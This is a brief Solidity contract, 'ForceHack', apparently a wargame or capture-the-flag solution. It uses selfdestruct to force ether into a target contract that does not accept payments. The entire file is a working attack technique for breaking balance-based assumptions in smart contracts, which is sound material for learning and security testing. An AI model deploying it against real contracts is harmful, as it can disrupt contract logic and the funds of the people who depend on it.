// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract ForceHack {
    function hack(address target) external payable {
        selfdestruct(payable(target));
    }
}